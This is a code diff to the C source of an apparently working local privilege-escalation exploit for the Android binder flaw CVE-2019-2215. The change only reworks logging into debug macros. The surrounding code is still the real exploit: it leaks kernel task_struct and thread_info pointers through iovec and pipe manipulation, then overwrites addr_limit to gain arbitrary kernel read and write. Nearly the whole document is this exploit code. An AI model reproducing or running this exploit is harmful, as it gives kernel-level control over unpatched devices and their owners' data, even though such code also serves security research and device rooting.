@@ -48,6 +48,8 @@
 #include <linux/limits.h>
 #include <stddef.h>
 
+#include "debug.h"
+
 #define MAX_PACKAGE_NAME 1024
 
 #define MIN(x, y) ((x) < (y) ? (x) : (y))
@@ -63,24 +65,9 @@
 #define PAGE 0x1000ul
 #define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8
 
-void message(char *fmt, ...)
-{
-    va_list ap;
-    va_start(ap, fmt);
-    vprintf(fmt, ap);
-    va_end(ap);
-    putchar('\n');
-}
-
-void error(char* fmt, ...)
-{
-    va_list ap;
-    va_start(ap, fmt);
-    vfprintf(stderr, fmt, ap);
-    va_end(ap);
-    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
-    exit(1);
-}
+#define message(fmt, args...) PDBG(fmt "\n", ##args)
+#define info(fmt, args...) PNFO(fmt "\n", ##args)
+#define error(fmt, args...) PERR(fmt "\n", ##args)
 
 int isKernelPointer(unsigned long p) {
     return p >= KERNEL_BASE && p<=0xFFFFFFFFFFFFFFFEul; 
@@ -207,7 +194,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     message("PARENT: readv returns %d, expected %d", b, totalLength);
 
     if (testDatum != testValue)
-        message( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
+        info( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
     else
         message("PARENT: clobbering test passed");
 
@@ -325,7 +312,7 @@ int leak_data(void *leakBuffer, int leakAmount,
             if (clobber_data(addr, &extra, sizeof(extra))) 
                 message("CHILD: clobbered");
             else {
-                message("CHILD: **fail** iovec clobbering didn't work");
+                info("CHILD: **fail** iovec clobbering didn't work");
                 childSuccess = 0;
             }
         }
@@ -365,7 +352,7 @@ int leak_data(void *leakBuffer, int leakAmount,
         
         if (badPointer) {
             errno = 0;
-            message("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
+            info("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
         }
         exit(0);
     }
@@ -375,16 +362,16 @@ int leak_data(void *leakBuffer, int leakAmount,
     b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
     message("PARENT: writev() returns 0x%x", (unsigned int)b);
     if (b != totalLength) {
-        message( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
+        info( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
         success = 0;
         goto DONE;
     }
 
-    message("PARENT: Reading leaked data");
+    info("PARENT: Reading leaked data");
 
     b = read(leakPipe[0], dataBuffer, adjLeakAmount);
     if (b != adjLeakAmount) {
-        message( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
+        info( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
         success = 0;
         goto DONE;
     }
@@ -394,10 +381,10 @@ int leak_data(void *leakBuffer, int leakAmount,
 
     if (extraLeakAmount != 0)
     {
-        message("PARENT: Reading extra leaked data");
+        info("PARENT: Reading extra leaked data");
         b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
         if (b != extraLeakAmount) {
-            message( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%lx", b, extraLeakAmount);
+            info( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%x", b, extraLeakAmount);
             success = 0;
             goto DONE;
         }
@@ -406,7 +393,7 @@ int leak_data(void *leakBuffer, int leakAmount,
     if (task_struct_plus_8_p != NULL)
     {
         if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
-            message( "PARENT: **fail** reading leaked task_struct at offset 8");
+            info( "PARENT: **fail** reading leaked task_struct at offset 8");
             success = 0;
             goto DONE;
         }
@@ -435,7 +422,7 @@ DONE:
     free(dataBuffer);
 
     if (success) 
-        message("PARENT: leaking successful");
+        info("PARENT: leaking successful");
     
     return success;
 }
@@ -445,22 +432,22 @@ int leak_data_retry(void *leakBuffer, int leakAmount,
                unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p) {
     int try = 0;
     while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, task_struct_plus_8_p)) {
-        message("MAIN: **fail** retrying");
+        info("MAIN: **fail** retrying");
         try++;
     }
     if (0 < try && try < RETRIES) 
-        message("MAIN: it took %d tries, but succeeded", try);
+        info("MAIN: it took %d tries, but succeeded", try);
     return try < RETRIES;        
 }
 
 int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned long payloadLength) {
     int try = 0;
     while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
-        message("MAIN: **fail** retrying");
+        info("MAIN: **fail** retrying");
         try++;
     }
     if (0 < try && try < RETRIES) 
-        message("MAIN: it took %d tries, but succeeded", try);
+        info("MAIN: it took %d tries, but succeeded", try);
     return try < RETRIES;        
 }
 
@@ -510,7 +497,7 @@ int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len)
 unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
     unsigned long kstack_data[16384/8];
     
-    message("MAIN: parsing kernel stack to find thread_info");
+    info("MAIN: parsing kernel stack to find thread_info");
     if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data), NULL, NULL)) 
         error("Cannot leak kernel stack");
     
@@ -524,7 +511,7 @@ unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
 int cve_2019_2215_0x98(uint64_t *current_task_addr)
 {
     *current_task_addr = 0;
-    message("MAIN: starting exploit for devices with waitqueue at 0x98");
+    info("MAIN: starting exploit for devices with waitqueue at 0x98");
 
     if (pipe(kernel_rw_pipe))
         error( "kernel_rw_pipe");
@@ -544,27 +531,26 @@ int cve_2019_2215_0x98(uint64_t *current_task_addr)
     unsigned long thread_info_ptr;
     
     if (task_struct_plus_8 == USER_DS) {
-        message("MAIN: thread_info is in task_struct");
+        info("MAIN: thread_info is in task_struct");
         thread_info_ptr = task_struct_ptr;
     }
     else {
-        message("MAIN: thread_info should be in stack");
+        info("MAIN: thread_info should be in stack");
         thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
         if (thread_info_ptr  == 0)
             error("cannot find thread_info on kernel stack");
     }
     
-    message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
-    message("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
-    message("MAIN: Clobbering addr_limit");
+    info("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
+    info("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
+    info("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
 
     if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
         error("Failed to clobber addr_limit");
     }
 
-    message("MAIN: thread_info = 0x%lx", thread_info_ptr);
-    message("MAIN: should have stable kernel R/W now");
+    info("MAIN: should have stable kernel R/W now");
 
     return 0;
 }
